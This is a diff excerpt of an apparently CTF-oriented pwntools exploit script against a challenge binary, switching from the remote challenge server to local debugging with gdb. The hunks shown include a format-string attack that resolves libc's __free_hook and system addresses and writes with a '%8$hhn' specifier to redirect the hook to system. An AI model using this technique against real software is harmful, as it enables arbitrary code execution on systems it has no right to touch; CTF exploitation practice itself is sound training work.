@@ -2,13 +2,13 @@ from pwn import *
 binary = "./program_patched"
 
 p = process(binary)
-p = remote("chal.firebird.sh", 35042)
+#p = remote("chal.firebird.sh", 35042)
 elf = ELF(binary)
 libc = ELF('./libc.so.6')
 s = '''
 b* enrollment_simulator+218
 '''
-#gdb.attach(p, s)
+gdb.attach(p, s)
 
 # First interaction - input email and reason
 p.sendlineafter(b"6. Quit", b'1')
@@ -51,6 +51,8 @@ sys_addr = libc.sym['system']
 print(hex(free_hook_addr))
 print(hex(sys_addr))
 #payload = fmtstr_payload(8, {libc.sym['__free_hook'] : libc.sym['system']})
+
+
 
 format_specifiers = b'%144c%8$hhn'
 
